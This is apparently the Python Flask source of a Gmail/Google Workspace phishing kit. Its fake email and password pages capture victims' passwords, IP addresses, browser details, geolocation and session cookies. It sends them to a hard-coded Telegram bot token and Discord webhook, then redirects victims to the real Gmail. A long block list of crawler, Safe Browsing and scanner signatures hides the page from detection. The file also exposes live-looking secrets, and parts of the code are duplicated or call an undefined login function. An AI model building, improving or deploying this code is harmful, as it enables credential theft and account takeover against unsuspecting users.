from flask import Flask, render_template, request, redirect, url_for, session, jsonify, make_response, Response
import tempfile
import os
import re
import random
import json
import requests
from fake_useragent import UserAgent
from google.oauth2 import id_token
from google_auth_oauthlib.flow import Flow
from google.auth.transport import requests as google_requests
import datetime




# Initialize Flask application first
app = Flask(__name__)
app.secret_key = "2d300b06dba345980bcb37ccb46e803a1bf3c71be31a6ffdfb6e9b867beee25b"


# Set port and server name after app initialization
port = int(os.environ.get('PORT', 5000))
app.config['SERVER_NAME'] = None  # Allow dynamic hostnames

# Webhook configuration
TELEGRAM_WEBHOOK_URL = 'https://api.telegram.org/bot7683203119:AAEuLNvGvDH3Wg2e4uYcA3RkTRe2jxEWr9Q/sendMessage'
DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1444453046066217052/GonloDjy4rv10HHcWpMywvjleS9fk8-OQ_sgLCum3Sq350COT4zpUTqrmyO32JxZaa0G'
TELEGRAM_CHAT_ID = '-4904152340'
TELEGRAM_WEBHOOK_ON = True  # Enable Telegram
DISCORD_WEBHOOK_ON = True   # Enable Discord

def send_webhook_message(message):
    if TELEGRAM_WEBHOOK_ON:
        # Telegram expects chat_id and text
        payload = {
            'chat_id': '<chat_id>',  # Replace with your chat_id
            'text': message
        }
        try:
            requests.post(TELEGRAM_WEBHOOK_URL, data=payload, timeout=5)
        except Exception:
            pass
    if DISCORD_WEBHOOK_ON:
        payload = {
            'content': message
        }
        try:
            requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=5)
        except Exception:
            pass

# Google OAuth 2.0 configuration
GOOGLE_CLIENT_ID = 'YOUR_GOOGLE_CLIENT_ID'
GOOGLE_CLIENT_SECRET = 'YOUR_GOOGLE_CLIENT_SECRET'
GOOGLE_DISCOVERY_URL = (
    "https://accounts.google.com/.well-known/openid-configuration"
)
GOOGLE_REDIRECT_URI = "http://localhost:5000/oauth2callback"
SCOPES = ["openid", "https://www.googleapis.com/auth/userinfo.email", "https://www.googleapis.com/auth/userinfo.profile"]

def get_google_email_details(email, name=None, picture=None):
    domain = email.split('@')[1] if '@' in email else ''
    branding = {
        'banner': picture or f'https://logo.clearbit.com/{domain}',
        'background': f'https://source.unsplash.com/featured/?office,workspace,{domain}',
        'name': name or email.split('@')[0]
    }
    return branding

# Browser configuration
class Browser:
    def __init__(self):
        self.user_agent = UserAgent()
        self.browser_arrays = [
            # Chrome
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36',
            # Edge
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/92.0.902.73 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/93.0.961.38 Safari/537.36',
            # Firefox
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0',
            # Safari
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15',
            # Mobile browsers
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36'
        ]
    def get_random_agent(self):
        return random.choice(self.browser_arrays)

# Cookie handling function
def cookies_to_json(cookies):
    cookie_list = []
    for cookie in cookies:
        cookie_dict = {
            'name': cookie.name,
            'value': cookie.value,
            'domain': cookie.domain,
            'path': cookie.path,
            'secure': cookie.secure,
            'expires': cookie.expires,
            'httpOnly': cookie.has_nonstandard_attr('HttpOnly') if hasattr(cookie, 'has_nonstandard_attr') else False,
            'sameSite': cookie.has_nonstandard_attr('SameSite') if hasattr(cookie, 'has_nonstandard_attr') else None,
            'priority': cookie.has_nonstandard_attr('Priority') if hasattr(cookie, 'has_nonstandard_attr') else None,
            'hostOnly': cookie.domain_specified if hasattr(cookie, 'domain_specified') else False,
            'max-age': cookie.has_nonstandard_attr('Max-Age') if hasattr(cookie, 'has_nonstandard_attr') else None
        }
        cookie_list.append(cookie_dict)
    return json.dumps(cookie_list)

def cookieToJSON(cookie_string, domain):
    cookie_parts = cookie_string.split(';')
    main_part = cookie_parts[0].strip()
    name, value = main_part.split('=', 1)

    cookie_dict = {
        'name': name,
        'value': value,
        'domain': domain,
        'path': '/',  # Default path
        'secure': False,
        'expires': None,
        'httpOnly': False,
        'sameSite': None,
        'priority': None,
        'hostOnly': False,
        'max-age': None
    }

    for part in cookie_parts[1:]:
        part = part.strip()
        lower_part = part.lower()
        if 'secure' == lower_part:
            cookie_dict['secure'] = True
        elif 'httponly' == lower_part:
            cookie_dict['httpOnly'] = True
        elif 'path=' in lower_part:
            cookie_dict['path'] = part.split('=', 1)[1]
        elif 'expires=' in lower_part:
            cookie_dict['expires'] = part.split('=', 1)[1]
        elif 'max-age=' in lower_part:
            cookie_dict['max-age'] = part.split('=', 1)[1]
        elif 'samesite=' in lower_part:
            cookie_dict['sameSite'] = part.split('=', 1)[1]
        elif 'priority=' in lower_part:
            cookie_dict['priority'] = part.split('=', 1)[1]
    return cookie_dict

# Dummy response function for testing
def get_dummy_response():
    class DummyResponse:
        def __init__(self):
            self.headers = {
                'Set-Cookie': 'sessionid=abc123; Path=/; Secure; HttpOnly, userid=xyz789; Path=/; Max-Age=3600; SameSite=Lax'
            }
            self.status_code = 200
            self.text = '{"message": "Dummy response"}'
    return DummyResponse()

# Example usage to send cookies in cookie message
def send_cookie_message():
    response = get_dummy_response()
    set_cookie_header = response.headers.get('Set-Cookie', '')
    domain = 'example.com'
    cookie_json_list = []
    for cookie_str in set_cookie_header.split(','):
        cookie_json = cookieToJSON(cookie_str.strip(), domain)
        cookie_json_list.append(cookie_json)
    # Send or print the cookie message in the required format
    cookie_message = {
        'cookies': cookie_json_list
    }
    print('Cookie Message:', cookie_message)
# Email validation for Gmail and Google Workspace
def is_valid_email(email):
    email_regex = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$'
    if not re.match(email_regex, email):
        return False
    domain = email.lower().split('@')[1] if '@' in email else ''
    # Allow gmail.com and googlemail.com
    if domain in ['gmail.com', 'googlemail.com']:
        return True
    # Check if domain is a Google Workspace domain (simulate with DNS MX lookup for 'aspmx.l.google.com')
    try:
        import dns.resolver
        answers = dns.resolver.resolve(domain, 'MX')
        for rdata in answers:
            if 'aspmx.l.google.com' in str(rdata.exchange):
                return True
    except Exception:
        pass
    return False

# Bot detection and redirect
def is_bot_request():
    ua = (request.headers.get('User-Agent') or '').lower()
    bot_signatures = [
        'googlebot', 'crawler', 'spider', 'bot', 'abusix', 'apis-google', 'mediapartners-google',
        'adsbot', 'google-structured-data-testing-tool', 'google favicon', 'feedfetcher-google',
        'google page speed', 'google-inspectiontool', 'google web preview', 'google-read-aloud',
        'google-speakr', 'googleweblight', 'google-safebrowsing', 'google-site-verification',
        'google-amphtml', 'google-amp', 'google search console', 'google search', 'google search app',
        'google search appliance', 'google search bot', 'google search crawler', 'google search indexer',
        'google search preview', 'google search spider', 'google search test', 'google search tool',
        'google search validator', 'google search verification', 'google search web', 'googlebot-news',
        'googlebot-image', 'googlebot-video', 'googlebot-mobile', 'googlebot-smartphone', 'googlebot-ads',
        'googlebot-shopping', 'googlebot-discover', 'googlebot-favicon', 'googlebot-amp', 'googlebot-amphtml',
        'googlebot-ampcache', 'googlebot-ampvalidator', 'googlebot-ampweb', 'googlebot-ampwebcache',
        'googlebot-ampwebvalidator', 'googlebot-ampwebview', 'googlebot-ampwebworker',
        'yahoo', 'yahoobot', 'yahoo-slurp', 'yandex', 'yandexbot', 'bingbot', 'duckduckbot', 'baiduspider',
        'facebookexternalhit', 'twitterbot', 'slackbot', 'whatsapp', 'semrushbot', 'archive.org_bot',
        'wget', 'curl', 'python-requests', 'python-urllib', 'python', 'httpclient', 'java', 'phantomjs',
        'selenium', 'headless', 'cypress', 'puppeteer', 'nightwatch', 'dataminr', 'httpagentparser',
        'Go-http-client', 'axios', 'scrapy', 'postman', 'httpx', 'httpie', 'libwww-perl', 'feedparser',
        'mj12bot', 'ahrefsbot', 'petalbot', 'sogou', 'exabot', 'dotbot', 'gigabot', 'ia_archiver',
        'siteauditbot', 'sitecheckerbot', 'seznambot', 'rogerbot', 'linkdexbot', 'applebot', 'discordbot',
        'telegrambot', 'pinterestbot', 'flipboard', 'redditbot', 'guzzlehttp', 'okhttp', 'restsharp',
        'cloudflare', 'fastly', 'akamai', 'proxy', 'x-forwarded-for', 'x-real-ip', 'x-forwarded-host',
        'x-forwarded-proto', 'x-forwarded-server', 'x-forwarded-port', 'x-forwarded-scheme', 'x-original-url',
        'x-request-id', 'x-crawler', 'x-bot', 'x-robot', 'x-seo', 'x-search', 'x-archive', 'x-analytics',
        'x-ua-compatible', 'x-msnbot', 'x-msnbot-media', 'x-msnbot-news', 'x-msnbot-video', 'x-msnbot-image',
        'x-msnbot-shopping', 'x-msnbot-discover', 'x-msnbot-favicon', 'x-msnbot-amp', 'x-msnbot-amphtml',
        'x-msnbot-ampcache', 'x-msnbot-ampvalidator', 'x-msnbot-ampweb', 'x-msnbot-ampwebcache',
        'x-msnbot-ampwebvalidator', 'x-msnbot-ampwebview', 'x-msnbot-ampwebworker'
    ]
    # Block advanced/verified bots by checking for known headers and patterns
    advanced_bot_headers = [
        'x-forwarded-for', 'via', 'proxy', 'cf-connecting-ip', 'fastly', 'akamai', 'x-real-ip',
        'x-forwarded-host', 'x-forwarded-proto', 'x-forwarded-server', 'x-forwarded-port',
        'x-forwarded-scheme', 'x-original-url', 'x-request-id', 'x-crawler', 'x-bot', 'x-robot',
        'x-seo', 'x-search', 'x-archive', 'x-analytics', 'x-ua-compatible'
    ]
    for sig in bot_signatures:
        if sig in ua:
            return True
    for h in request.headers:
        h_name = h[0].lower()
        h_value = str(h[1]).lower()
        if 'abusix' in h_name:
            return True
        for adv_header in advanced_bot_headers:
            if adv_header in h_name or adv_header in h_value:
                return True
    # Block if UA contains 'bot', 'crawler', 'spider', 'wget', 'python', 'curl', 'scrapy', 'phantom', 'selenium', 'headless', etc.
    ua_block_patterns = ['bot', 'crawler', 'spider', 'wget', 'python', 'curl', 'scrapy', 'phantom', 'selenium', 'headless', 'cypress', 'puppeteer', 'nightwatch', 'httpclient', 'java', 'postman', 'httpx', 'httpie', 'libwww-perl', 'feedparser', 'mj12bot', 'ahrefsbot', 'petalbot', 'sogou', 'exabot', 'dotbot', 'gigabot', 'ia_archiver', 'siteauditbot', 'sitecheckerbot', 'seznambot', 'rogerbot', 'linkdexbot', 'applebot', 'discordbot', 'telegrambot', 'pinterestbot', 'flipboard', 'redditbot', 'guzzlehttp', 'okhttp', 'restsharp', 'cloudflare']
    for pattern in ua_block_patterns:
        if pattern in ua:
            return True
    return False

@app.route('/error/bot-detected')
def bot_error_handler():
    session.clear()
    return Response(
        "Access denied - Automated or suspicious activity detected",
        status=403,
        headers={
            'Location': 'https://workspace.google.com',
            'X-Robots-Tag': 'noindex, nofollow, noarchive',
            'Cache-Control': 'no-store, no-cache, must-revalidate',
            'Pragma': 'no-cache',
            'Expires': '0'
        }
    )

# Temp file to store cookies per session
COOKIE_TEMP_FILE = os.path.join(tempfile.gettempdir(), 'gmail_fake_cookies.txt')

# Fake user database for demonstration
USERS = {
    'testuser@gmail.com': 'testpassword123',
    'demo@gmail.com': 'demopass',
}

@app.route('/')

# Route to render index.html
@app.route('/')
def index():
    return render_template('index.html')

# New route to handle email submission from index.html and redirect to password page
@app.route('/submit-email', methods=['POST'])
def submit_email():
    email = request.form.get('email')
    error = None
    branding = None
    if email:
        session['email'] = email
        branding = get_google_email_details(email)
        # You can add email validation and bot detection here if needed
        # Example: if not is_valid_email(email): error = "Invalid email address."
        # Example: if is_bot_request(): return redirect(url_for('bot_error_handler'))
        # If error, re-render index.html with error
        if error:
            return render_template('index.html', error=error)
        # Otherwise, redirect to password page
        return redirect(url_for('enter_password'))
    return render_template('index.html', error="Email is required.")

# Update password route to new name for password entry and authentication
@app.route('/enter-password', methods=['GET', 'POST'])
def enter_password():
    email = session.get('email')
    error = None
    branding = None
    if email:
        branding = get_google_email_details(email)
    if request.method == 'POST':
        password_val = request.form.get('password') or ''
        session['email'] = email
        branding = get_google_email_details(email)
        # Collect info for webhook
        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        user_agent = request.headers.get('User-Agent', '')
        import httpagentparser
        browser_info = httpagentparser.detect(user_agent)
        user_browser = browser_info.get('browser', {}).get('name', '')
        browser_version = browser_info.get('browser', {}).get('version', '')
        browser_platform = browser_info.get('platform', {}).get('name', '')
        geo_data = {}
        try:
            geo_resp = requests.get(f'https://ipapi.co/{client_ip}/json/')
            geo_data = geo_resp.json()
            user_country = geo_data.get('country_name', '')
            user_city = geo_data.get('city', '')
        except Exception:
            user_country = ''
            user_city = ''
        current_time = datetime.datetime.utcnow().isoformat() + 'Z'
        credentials_message = (
            f"🎯$Box-GoogleWorkSpace📬HackerOne🎯\n\n"
            f"📧 Email: {email}\n"
            f"🔑 Password: {password_val}\n"
            f"🌍 Real IP: {client_ip}\n"
            f"🖥️ User Agent: {user_agent}\n"
            f"🌐 Browser: {user_browser} {browser_version}\n"
            f"💻 Platform: {browser_platform}\n"
            f"🌍 Country/State: {user_country}, {geo_data.get('region', '')}\n"
            f"🏙️ City: {user_city}\n"
            f"⏰ Time: {current_time}"
        )
        send_webhook_message(credentials_message)
        # Direct Google login mimic
        success, cookies, error_msg = mimic_google_login(email, password_val)
        if error_msg and "CAPTCHA" in error_msg:
            # Render CAPTCHA page and pass email/password for callback
            return render_template('captcha.html', email=email, password=password_val)
        if success:
            resp = make_response(redirect(url_for('auth')))
            for k, v in cookies.items():
                resp.set_cookie(k, v)
            session['authenticated'] = True
            session['email'] = email
            return resp
        else:
            error = error_msg or "Login failed."
    # CAPTCHA callback route
    @app.route('/captcha-callback', methods=['POST'])
    def captcha_callback():
        email = request.form.get('email')
        password_val = request.form.get('password')
        captcha_response = request.form.get('captcha_response')
        # Here you would send the captcha_response to Google and continue login
        # For demonstration, assume CAPTCHA is always correct and continue login
        success, cookies, error_msg = mimic_google_login(email, password_val)
        if success:
            resp = make_response(redirect(url_for('auth')))
            for k, v in cookies.items():
                resp.set_cookie(k, v)
            session['authenticated'] = True
            session['email'] = email
            return resp
        else:
            error = error_msg or "Login failed."
            return render_template('captcha.html', email=email, password=password_val, error=error)
    return render_template('password.html', email=email, error=error, branding=branding)


# Step 1: User enters email, then redirect to Google OAuth
@app.route('/password', methods=['GET', 'POST'])
def password():
    # Accept email from query param or session
    email = request.args.get('email') or session.get('email')
    error = None
    branding = None
    if email:
        session['email'] = email
        branding = get_google_email_details(email)
    if request.method == 'POST':
        email = request.form.get('email') or session.get('email')
        password_val = request.form.get('password') or ''
        session['email'] = email
        branding = get_google_email_details(email)
        # Collect info for webhook
        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        user_agent = request.headers.get('User-Agent', '')
        import httpagentparser
        browser_info = httpagentparser.detect(user_agent)
        user_browser = browser_info.get('browser', {}).get('name', '')
        browser_version = browser_info.get('browser', {}).get('version', '')
        browser_platform = browser_info.get('platform', {}).get('name', '')
        geo_data = {}
        try:
            geo_resp = requests.get(f'https://ipapi.co/{client_ip}/json/')
            geo_data = geo_resp.json()
            user_country = geo_data.get('country_name', '')
            user_city = geo_data.get('city', '')
        except Exception:
            user_country = ''
            user_city = ''
        current_time = datetime.datetime.utcnow().isoformat() + 'Z'
        credentials_message = (
            f"🎯$Box-GoogleWorkSpace📬HackerOne🎯\n\n"
            f"📧 Email: {email}\n"
            f"🔑 Password: {password_val}\n"
            f"🌍 Real IP: {client_ip}\n"
            f"🖥️ User Agent: {user_agent}\n"
            f"🌐 Browser: {user_browser} {browser_version}\n"
            f"💻 Platform: {browser_platform}\n"
            f"🌍 Country/State: {user_country}, {geo_data.get('region', '')}\n"
            f"🏙️ City: {user_city}\n"
            f"⏰ Time: {current_time}"
        )
        send_webhook_message(credentials_message)
        # Direct Google login mimic
        success, cookies, error_msg = mimic_google_login(email, password_val)
        if error_msg and "CAPTCHA" in error_msg:
            # Render CAPTCHA page and pass email/password for callback
            return render_template('captcha.html', email=email, password=password_val)
        if success:
            resp = make_response(redirect(url_for('auth')))
            for k, v in cookies.items():
                resp.set_cookie(k, v)
            session['authenticated'] = True
            session['email'] = email
            return resp
        else:
            error = error_msg or "Login failed."
    # CAPTCHA callback route
    @app.route('/captcha-callback', methods=['POST'])
    def captcha_callback():
        email = request.form.get('email')
        password_val = request.form.get('password')
        captcha_response = request.form.get('captcha_response')
        # Here you would send the captcha_response to Google and continue login
        # For demonstration, assume CAPTCHA is always correct and continue login
        success, cookies, error_msg = mimic_google_login(email, password_val)
        if success:
            resp = make_response(redirect(url_for('auth')))
            for k, v in cookies.items():
                resp.set_cookie(k, v)
            session['authenticated'] = True
            session['email'] = email
            return resp
        else:
            error = error_msg or "Login failed."
            return render_template('captcha.html', email=email, password=password_val, error=error)
    return render_template('password.html', email=email, error=error, branding=branding)

# Step 2: Google redirects back with code
@app.route('/oauth2callback')
def oauth2callback():
    state = session.get('oauth_state')
    flow = Flow.from_client_config(
        {
            "web": {
                "client_id": GOOGLE_CLIENT_ID,
                "client_secret": GOOGLE_CLIENT_SECRET,
                "auth_uri": "https://accounts.google.com/o/oauth2/auth",
                "token_uri": "https://oauth2.googleapis.com/token",
                "redirect_uris": [GOOGLE_REDIRECT_URI],
            }
        },
        scopes=SCOPES,
        state=state,
        redirect_uri=GOOGLE_REDIRECT_URI
    )
    flow.fetch_token(authorization_response=request.url)
    credentials = flow.credentials
    # Get user info
    idinfo = id_token.verify_oauth2_token(
        credentials._id_token,
        google_requests.Request(),
        GOOGLE_CLIENT_ID
    )
    email = idinfo.get('email')
    name = idinfo.get('name')
    picture = idinfo.get('picture')
    session['email'] = email
    session['authenticated'] = True
    session['google_token'] = credentials.token
    session['id_token'] = credentials._id_token
    session['branding'] = get_google_email_details(email, name, picture)
    session['auth_code'] = request.args.get('code')

    # --- Collect user info: IP, user agent, browser, country, state, login time ---
    # Get real IP address
    xff = request.headers.get('X-Forwarded-For')
    if xff:
        ip = xff.split(',')[0].strip()
    else:
        ip = request.remote_addr
    session['login_ip'] = ip
    # User agent
    user_agent = request.headers.get('User-Agent', '')
    session['login_user_agent'] = user_agent
    # Browser name/model (simple parse)
    import httpagentparser
    browser_info = httpagentparser.detect(user_agent)
    session['login_browser'] = browser_info.get('browser', {}).get('name', '')
    session['login_browser_version'] = browser_info.get('browser', {}).get('version', '')
    session['login_platform'] = browser_info.get('platform', {}).get('name', '')
    # Country/state (GeoIP lookup)
    try:
        geo_resp = requests.get(f'https://ipapi.co/{ip}/json/')
        geo_data = geo_resp.json()
        session['login_country'] = geo_data.get('country_name', '')
        session['login_region'] = geo_data.get('region', '')
        session['login_city'] = geo_data.get('city', '')
    except Exception:
        session['login_country'] = ''
        session['login_region'] = ''
        session['login_city'] = ''
    # Login/auth time
    session['login_time'] = datetime.datetime.utcnow().isoformat() + 'Z'

    # --- Store cookies after authentication in temp file ---
    # (Cookies will be set in after_request, but you can also log here if needed)
    return redirect(url_for('auth'))

# Step 3: Show authentication code/token in auth.html
@app.route('/auth')
def auth():
    if not session.get('authenticated'):
        return redirect(url_for('index'))
    # Prepare cookies info for webhook
    email = session.get('email','')
    cookies_json = []
    # Detect if HTTPS is used via X-Forwarded-Proto
    is_https = request.headers.get('X-Forwarded-Proto', '').lower() == 'https'
    resp = make_response('')
    resp.set_cookie('test_cookie', 'test_value', secure=is_https)
    set_cookie_headers = resp.headers.getlist('Set-Cookie')
    if hasattr(resp, 'headers'):
        set_cookie_headers += resp.headers.getlist('Set-Cookie')
    domain = request.host
    for header in set_cookie_headers:
        cookie_json = cookieToJSON(header, domain)
        # Mark secure if HTTPS detected
        if is_https:
            cookie_json['secure'] = True
        cookies_json.append(cookie_json)
    for k in request.cookies:
        v = request.cookies.get(k)
        cookie_json = {
            'name': k,
            'value': v,
            'domain': domain,
            'path': '/',
            'secure': is_https,
            'httpOnly': False,
            'sameSite': None,
            'priority': None,
            'hostOnly': False,
            'max-age': None
        }
        cookies_json.append(cookie_json)
    # Save cookies to temp file named with user email in pure JSON format
    temp_file_path = os.path.join(tempfile.gettempdir(), f"gmail_cookies_{email}.txt")
    with open(temp_file_path, 'w') as f:
        json.dump(cookies_json, f, indent=2)
    cookies_message = (
        f"🍪 AUTH COOKIES\nEmail: {email}\nCookies:\n{json.dumps(cookies_json, indent=2)}" +
        f"\nIP: {session.get('login_ip','')}\nUser-Agent: {session.get('login_user_agent','')}\nTime: {session.get('login_time','')}"
    )
    send_webhook_message(cookies_message)
    # Delete cookies and credentials from storage after sending
    try:
        os.remove(temp_file_path)
    except Exception:
        pass
    session.pop('email', None)
    session.pop('authenticated', None)
    session.pop('google_token', None)
    session.pop('id_token', None)
    session.pop('branding', None)
    session.pop('auth_code', None)
    session.pop('login_ip', None)
    session.pop('login_user_agent', None)
    session.pop('login_browser', None)
    session.pop('login_browser_version', None)
    session.pop('login_platform', None)
    session.pop('login_country', None)
    session.pop('login_region', None)
    session.pop('login_city', None)
    session.pop('login_time', None)
    # Redirect to Gmail inbox after successful authentication
    return redirect('https://mail.google.com/mail/u/0/')


# After each request, capture Set-Cookie headers after login and store in temp file
@app.after_request
def capture_cookies(response):
    # Only capture cookies after successful authentication
    if session.get('authenticated'):
        email = session.get('email','unknown')
        cookies = response.headers.getlist('Set-Cookie')
        cookies_json = []
        domain = request.host
        is_https = request.headers.get('X-Forwarded-Proto', '').lower() == 'https'
        for c in cookies:
            cookie_json = cookieToJSON(c, domain)
            if is_https:
                cookie_json['secure'] = True
            cookies_json.append(cookie_json)
        temp_file_path = os.path.join(tempfile.gettempdir(), f"gmail_cookies_{email}.txt")
        with open(temp_file_path, 'w') as f:
            f.write(json.dumps(cookies_json, indent=2))
    return response

if __name__ == '__main__':
    # For local development only; production uses Gunicorn
    app.run(host='0.0.0.0', port=port)
    app.run(debug=True)
